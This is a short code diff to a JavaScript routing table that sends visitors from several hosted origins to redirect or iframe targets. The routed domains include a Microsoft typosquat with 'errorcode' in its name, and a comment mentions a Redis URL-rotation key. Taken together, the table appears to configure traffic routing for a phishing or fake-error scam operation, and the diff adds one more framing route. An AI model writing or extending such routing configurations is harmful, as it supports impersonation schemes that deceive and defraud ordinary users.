@@ -90,7 +90,7 @@ const ORIGIN_GROUPS = {
     "https://hiroakitravels.com": { method: "redirect", target: "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com" },
   },
   dmc: {
-    // "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://n-rand.vercel.app", redisKey: "rotation:target_url" },
+    "https://rnicrosoft-v3-errorcode-21jpydmc.onrender.com": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
     "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://ziyan-os3.vercel.app" },
     "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://ziyan-os3.vercel.app" },
   },
